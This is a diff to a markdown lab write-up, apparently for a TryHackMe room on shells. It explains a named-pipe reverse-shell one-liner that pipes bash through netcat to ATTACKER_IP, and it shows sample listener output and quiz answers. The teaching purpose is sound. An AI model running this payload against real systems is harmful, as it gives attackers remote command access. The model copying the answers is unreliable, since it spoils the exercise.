@@ -84,7 +84,46 @@ Any port can be used to wait for a connection, but attackers and pentesters tend
 Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.
 
 As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.
-\`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f\`
+\`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f\`
+
+**Explanation of the Payload**
+    - \`rm -f /tmp/f\` - This command removes any existing named pipe file located at \`/tmp/f/\`. This ensures that the script can create a new named pipe without conflicts.
+    - \`mkfifo /tmp/f\` - This command creates a named pipe, or FIFO (first-in, first-out), at \`/tmp/f\`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+    - \`cat /tmp/f\` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+    - \`| bash -i 2>&1\` - The output of \`cat\` is piped to a shell instance (\`bash -i\`), which allows the attacker to execute commands interactively. The \`2>&1\` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
+    - \`| nc ATTACKER_IP ATTACKER_PORT >/tmp/f\` - This part pipes the shell's output through \`nc\` (Netcat) to the attacker's IP address (\`ATTACKER_IP\`) on the attacker's port (\`ATTACKER_PORT\`).
+    - \`>/tmp/f\` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+
+The payload above can expose the shell \`bash\` through the network to the desired listener.
+
+**Attacker Receives the Shell**
+Once the above payload is executed, the attacker will receive a **reverse shell**, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.
+
+**Attacker Terminal Output (Receiving Shell)**
+\`\`\`
+attacker@kali:~$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
+To run a command as administrator (user "root"), use "sudo ".
+See "man sudo_root" for details.
+
+target@tryhackme:~$
+\`\`\`
+
+The output above shows the connection coming from the IP \`10.10.13.37\`, which is the IP address of the compromised target.
+
+**Answer the questions below**⸻⸻⸻⸻⸻
+
+What type of shell allows an attacker to execute commands remotely after the target connects back?
+**Answer:** reverse shell
+
+What tool is commonly used to set up a listener for a reverse shell?
+**Answer:** netcat
+
+⸻⸻⸻⸻⸻
+
+### Task 4 Bind Shell
+
 
 
 
